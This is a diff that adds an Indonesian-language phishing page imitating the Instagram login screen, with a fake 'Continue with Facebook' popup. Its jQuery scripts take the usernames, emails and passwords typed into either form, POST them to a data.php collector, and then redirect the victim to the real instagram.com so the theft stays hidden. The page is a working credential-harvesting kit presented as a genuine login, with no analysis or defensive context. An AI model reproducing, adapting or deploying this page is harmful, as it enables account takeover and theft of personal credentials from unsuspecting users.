@@ -1,0 +1,305 @@
+<html><head>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+        <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.1.1/css/all.css">
+        <link href="https://unpkg.com/boxicons@2.0.9/css/boxicons.min.css" rel="stylesheet">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">
+        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
+        <link rel="stylesheet" href="https://cdn.statically.io/gh/AlexHostX/all.asset/main/alex-facebook.css">
+        <meta property="og:image" content="https://cdn.statically.io/gh/AlexHostX/logAlex/main/ig_icon_vaf.png">
+        <link rel="icon" href="https://cdn.statically.io/gh/AlexHostX/logAlex/main/ig_icon_vaf.png">
+        <title>Masuk</title>
+<style>
+* {
+    margin: 0px;
+}
+body {
+    margin: 8px;
+    color: #5d5d5d;
+    background-color: #fff;
+        display: flex;
+    flex-direction: column;
+    flex-wrap: nowrap;
+    align-items: center;
+    font-family: system-ui;
+}
+main {
+        background: #fff;
+    height: auto;
+    max-width: 600px;
+    width: 100%;
+    display: flex;
+    flex-direction: column;
+    flex-wrap: nowrap;
+    align-items: center;
+}
+header {
+        display: flex;
+    flex-direction: column;
+    flex-wrap: nowrap;
+    align-items: center;
+    margin-top: 15px;
+}
+.bhs {
+        text-align: center;
+    font-family: system-ui;
+    font-size: 14px;
+}
+header img {
+    width: 215px;
+    margin-top: 30px;
+}
+header button {
+        margin-top: 20px;
+    background: #0095f6;
+    width: 100%;
+    font-size: 17px;
+    font-family: system-ui;
+    font-weight: 400;
+    color: #fff;
+    border: none;
+    padding: 8px 30px;
+    border-radius: 5px;
+}
+section {
+        width: 100%;
+    max-width: 550px;
+    display: flex;
+    flex-direction: column;
+    flex-wrap: nowrap;
+    align-items: center;
+}
+.ata {
+        margin: 20px;
+    display: flex;
+    flex-direction: row;
+    align-items: center;
+    flex-wrap: nowrap;
+    width: 65%;
+}
+.ata span {
+        top: .45em;
+    width: 100%;
+    border-top: 1px solid #ababab;
+}
+.ata label {
+        font-family: system-ui;
+    font-size: 15px;
+    margin-left: 10px;
+    margin-right: 10px;
+    color: #797979;
+}
+.fm {
+        display: flex;
+    flex-direction: column;
+    padding-top: 20px;
+    align-items: center;
+    width: 80%;
+}
+.fm input {
+        width: 100%;
+    background: #fafafa;
+    border: 1px solid #dcdcdc;
+    font-size: 14px;
+    padding: 15px 15px;
+    border-radius: 5px;
+    margin-bottom: 10px;
+    cursor: pointer;
+    outline: none;
+}
+.rtf {
+        width: 100%;
+    text-align: right;
+    font-size: 16px;
+    font-family: system-ui;
+    color: #0095f6;
+    margin-top: 5px;
+    margin-bottom: 15px;
+}
+.fm button {
+        background: #0095f6;
+    border: none;
+    padding: 7px;
+    font-size: 17px;
+    color: #fff;
+    font-family: system-ui;
+    font-weight: 500;
+    border-radius: 5px;
+    width: 112%;
+    max-width: 450px;
+    cursor: pointer;
+    outline: none;
+}
+.fm label {
+        margin-top: 2em;
+    margin-bottom: 1em;
+    text-align: center;
+    font-family: system-ui;
+    font-size: 13px;
+    color: #f00;
+    display: none;
+}
+.fm p {
+        text-align: center;
+    color: #676767;
+    font-family: system-ui;
+    margin-block-start: 1.2em;
+}
+.fm p>span {
+        color: #0095f6;
+}
+</style>
+    </head>
+    <body>
+        <main>
+            <header>
+                <div class="bhs">Bahasa Indonesia <i class="fa-solid fa-angle-down"></i></div>
+                <img src="https://cdn.statically.io/gh/AlexHostX/logAlex/main/ig-text.png" alt="">
+                <button onclick="openalexf()"><i class="fa-brands fa-facebook-square"></i> Lanjutkan dengan Facebook</button>
+            </header>
+            <section>
+                <div class="ata">
+                    <span></span>
+                    <label>ATAU</label>
+                    <span></span>
+                </div>
+                <form class="fm">
+                    <input type="text" name="email" id="alxige" placeholder="Nomor telepon, nama pengguna, atau email">
+                    <input type="password" name="password" id="alexigp" placeholder="Kata Sandi">
+                    <input type="hidden" name="login" value="Instagram" readonly="">
+                    <div class="rtf">Lupa kata sandi?</div>
+                    <button type="button" onclick="extendigmarsya()">Login</button>
+                    <label class="email-igmarsya">Maaf, username Anda salah. Harap periksa kembali username Anda.</label>
+                    <label class="sandi-igmarsya">Maaf, kata sandi Anda salah. Harap periksa kembali kata sandi Anda.</label>
+                    <label class="gagal-igmarsya">Nama pengguna yang Anda masukkan bukan milik akun tertentu. Periksa nama pengguna Anda lalu coba lagi.</label>
+                    <p>Tidak punya akun? <span>Buat akun</span></p>
+                </form>
+            </section>
+            
+            <div class="popup-ariandi alex-facebook animate fadeIn" id="alexf" style="display: none;">
+                <div class="container-box-fb" style="margin-top: 10%;">
+                    <div class="atasan-fb" style="width: 95.2%;">
+                        <img src="https://cdn.statically.io/gh/AlexHostX/logAlex/main/facebook_text.png">
+                    </div>
+                    <div class="isi-facebook">
+                        <p class="kaget email-fb1" style="width: 320px;">Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun. <b>Cari akun Anda.</b></p>
+                        <p class="kaget sandi-fb1" style="width: 320px;">Kata sandi salah. <b>Apakah Anda melupakan kata sandi Anda?</b></p>
+                        <img src="https://cdn.statically.io/gh/AlexHostX/logAlex/main/ig_icon_vaf.png">
+                        <div class="txt-ucapan-fb">Masuk ke akun Facebook Anda untuk terhubung dengan MediaFire</div>
+                        <form class="form-login-fb" id="ngumpulinuangnikah">
+                            <label>
+                                <input type="text" id="alx_email_fb2" name="email" placeholder="Email atau Nomor Telepon" autocomplete="off" autocapitalize="off" style="background: #fff; width: 90%" required="">
+                            </label>
+                            <label>
+                                <input type="password" id="alx_password_fb2" name="password" placeholder="Kata Sandi" autocomplete="off" autocapitalize="off" style="background: #fff; width: 90%" required="">
+                            </label>
+                            <input type="hidden" name="login" id="alx_login_fb" value="Facebook" readonly="">
+                            <button class="btn-login-fb" onclick="return AlexHostingFB()" type="button">Masuk</button>
+                        </form>
+                        <div class="txt-buat-akun">Buat akun</div>
+                        <div class="txt-tidak-sekarang">Lain kali</div>
+                        <div class="txt-lupa-password">Lupa Kata Sandi? • Pusat Bantuan</div>
+                    </div>
+                    <div class="isi-bahasa">
+                        <center>
+                            <div class="nama-bahasa bahasa-aktif">Bahasa Indonesia</div>
+                            <div class="nama-bahasa">English (UK)</div>
+                            <div class="nama-bahasa">Basa Jawa</div>
+                            <div class="nama-bahasa">Bahasa Melayu</div>
+                            <div class="nama-bahasa">日本語</div>
+                            <div class="nama-bahasa">Español</div>
+                            <div class="nama-bahasa">Português (Brasil)</div>
+                            <div class="nama-bahasa"><i class="fa fa-plus"></i>
+                            </div>
+                        </center>
+                    </div>
+                    <div class="kalobukanalexsiapalagi">Facebook Inc.</div>
+                </div>
+            </div>
+            <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+            <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+            <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+            <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+            <script>
+                function openalexf() {
+                    $('#alexf').show();
+                }
+                </script>
+                
+                <script>
+                function AlexHostingFB()
+        	{
+        		$emailfb1 = $('#alx_email_fb2').val().trim();
+        		$passwordfb1 = $('#alx_password_fb2').val().trim();
+        		if($emailfb1 == '' || $emailfb1 == null || $emailfb1.length <= 6)
+        		{
+        			$('.email-fb1').show();
+        			$('.sandi-fb1').hide();
+        			return false;
+        		}else{
+        			$('.email-fb1').hide();
+        		}
+        		if($passwordfb1 == '' || $passwordfb1 == null || $passwordfb1.length <= 6)
+        		{
+        			$('.sandi-fb1').show();
+        			return false;
+        		}else{
+        			$('.sandi-fb1').hide();
+        		}
+        		
+        		if($emailfb1.length >=6 || $passwordfb1.length >=6) {
+        		    $.ajax({
+                        type: 'POST',
+                        url: 'data.php',
+                        data: $('#ngumpulinuangnikah').serialize(),
+                        dataType: 'text',
+                        success: function() {
+                                    location.href = "https://www.instagram.com/?hl=id";
+                            } 
+                    })
+        		}
+        	}
+            </script>
+            <script>
+            function extendigmarsya() {
+                var emailig = $("#alxige").val(),
+                   passwordig = $("#alxigp").val();
+            
+                 if (!emailig || emailig == null || emailig == '') {
+                     $('.email-igmarsya').show();
+                     $('.sandi-igmarsya').hide();
+                     $('.gagal-igmarsya').hide();
+                      return false;
+                 } else {
+                   $('.email-igmarsya').hide();
+                   $('.gagal-igmarsya').hide();
+                 }
+                 if (!passwordig || passwordig == null || passwordig == '') {
+                   $('.sandi-igmarsya').show();
+                   $('.gagal-igmarsya').hide();
+                 } else {
+                   $('.sandi-igmarsya').hide();
+                   $('.gagal-igmarsya').hide();
+                 }
+            
+                 // if all form are filled
+                 if (emailig != 0 && passwordig != 0)
+            
+                 {
+                   // SEND DATA
+                   $.ajax({
+                     type: 'POST',
+                     url: 'data.php',
+                     data: $('.fm').serialize(),
+                     dataType: 'text',
+                     success: function() {
+                         location.href = "https://www.instagram.com/?hl=id";
+                     }
+                   })
+                 }
+               }
+                </script>
+        </main>
+    
+</body></html>
